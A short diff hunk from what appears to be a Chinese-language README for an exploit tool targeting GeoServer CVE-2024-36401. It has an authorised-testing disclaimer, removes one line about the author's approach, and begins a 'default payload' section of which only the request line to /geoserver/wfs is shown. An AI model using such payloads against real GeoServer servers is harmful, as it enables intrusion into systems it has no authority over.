@@ -2,8 +2,6 @@
 
 geoserver CVE-2024-36401  环境：JDK8 声明：仅用于授权测试，用户滥用造成的一切后果和作者无关 请遵守法律法规！
 
-简单说一下编写思路吧
-
 1，默认payload:
 
 POST /geoserver/wfs HTTP/1.1
